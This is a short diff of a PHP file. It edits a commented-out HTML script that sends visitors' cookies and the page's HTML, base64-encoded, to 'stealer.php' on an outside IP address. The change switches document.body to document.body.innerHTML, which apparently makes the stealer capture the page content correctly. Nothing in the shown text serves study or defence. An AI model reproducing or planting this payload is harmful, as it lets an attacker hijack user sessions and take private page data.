@@ -6,7 +6,7 @@
 <?php
 /*
 <html>
-<script>document.write('<img src="http://81.4.124.11/stealer.php?cookie='+escape(document.cookie)+'&body='+escape(btoa(document.body))+'">');</script>
+<script>document.write('<img src="http://81.4.124.11/stealer.php?cookie='+escape(document.cookie)+'&body='+escape(btoa(document.body.innerHTML))+'">');</script>
 </html>
 */
 function GetIP() 
